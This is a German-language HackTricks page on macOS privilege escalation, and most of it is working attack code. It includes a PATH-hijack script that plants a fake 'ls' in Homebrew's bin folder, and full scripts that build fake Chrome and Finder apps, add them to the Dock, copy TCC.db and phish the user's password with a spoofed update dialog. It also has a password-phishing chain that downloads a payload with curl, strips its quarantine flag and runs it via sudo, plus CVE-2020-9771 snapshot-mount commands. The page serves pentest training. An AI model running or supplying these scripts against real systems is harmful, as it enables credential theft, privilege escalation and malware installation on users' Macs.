# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Wenn du hierher gekommen bist, um nach TCC privilege escalation zu suchen, gehe zu:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Bitte beachten Sie, dass **die meisten Tricks zur privilege escalation, die Linux/Unix betreffen, sich auch auf MacOS auswirken**. Siehe:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Benutzerinteraktion

### Sudo Hijacking

Du findest die ursprüngliche [Sudo Hijacking technique im Linux Privilege Escalation Beitrag](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Allerdings **bewahrt** macOS den **`PATH`** des Benutzers, wenn er **`sudo`** ausführt. Das bedeutet, dass ein anderer Weg, diesen Angriff durchzuführen, darin besteht, **hijack other binaries** zu platzieren, die das Opfer beim **Ausführen von sudo:** ausführt:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Beachte, dass ein Benutzer, der das Terminal verwendet, sehr wahrscheinlich **Homebrew installiert** hat. Daher ist es möglich, Binärdateien in **`/opt/homebrew/bin`** zu hijacken.

### Dock Impersonation

Mit etwas **social engineering** könntest du im Dock beispielsweise **impersonate Google Chrome** und tatsächlich dein eigenes Skript ausführen:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Einige Vorschläge:

- Prüfe im Dock, ob ein Chrome vorhanden ist, und **entferne** in diesem Fall diesen Eintrag und **füge** den **fake** **Chrome entry in the same position** im Dock-Array hinzu.
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
Einige Vorschläge:

- Du kannst **Finder nicht aus dem Dock entfernen**, also wenn du ihn dem Dock hinzufügen willst, könntest du den gefälschten Finder direkt neben dem echten platzieren. Dafür musst du **den gefälschten Finder-Eintrag am Anfang des Dock-Arrays hinzufügen**.
- Eine andere Option ist, es nicht im Dock zu platzieren und es einfach zu öffnen; "Finder asking to control Finder" ist nicht so seltsam.
- Eine weitere Möglichkeit, um ohne eine hässliche Passwortabfrage **escalate to root without asking** zu erreichen, ist, Finder wirklich das Passwort anfragen zu lassen, um eine privilegierte Aktion auszuführen:
- Fordere Finder auf, eine neue **`sudo`**-Datei nach **`/etc/pam.d`** zu kopieren (Die Passwortabfrage wird anzeigen, dass "Finder wants to copy sudo")
- Fordere Finder auf, ein neues **Authorization Plugin** zu kopieren (Du könntest den Dateinamen kontrollieren, sodass die Passwortabfrage anzeigt, dass "Finder wants to copy Finder.bundle")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware missbraucht häufig Benutzerinteraktion, um **ein sudo-fähiges Passwort zu erfassen** und es programmgesteuert wiederzuverwenden. Ein typischer Ablauf:

1. Ermittle den angemeldeten Benutzer mit `whoami`.
2. **Passwortabfragen wiederholen**, bis `dscl . -authonly "$user" "$pw"` Erfolg zurückgibt.
3. Speichere die Anmeldeinformationen (z. B. `/tmp/.pass`) und führe privilegierte Aktionen mit `sudo -S` aus (Passwort über stdin).

Beispiel einer minimalen Kette:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Das gestohlene Passwort kann dann wiederverwendet werden, um **die Gatekeeper-Quarantäne mit `xattr -c` zu löschen**, LaunchDaemons oder andere privilegierte Dateien zu kopieren und zusätzliche Stufen nicht-interaktiv auszuführen.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Jeder Benutzer** (auch nicht-privilegierte) kann einen time machine snapshot erstellen und mounten und **auf ALLE Dateien** dieses Snapshots zugreifen.\
Das **einzige Privileg**, das benötigt wird, ist, dass die verwendete Anwendung (wie `Terminal`) **Full Disk Access** (FDA) hat (`kTCCServiceSystemPolicyAllfiles`), welches von einem Admin gewährt werden muss.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Eine detailliertere Erklärung kann [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Empfindliche Informationen

Dies kann nützlich sein, um Privilegien zu eskalieren:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Referenzen

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
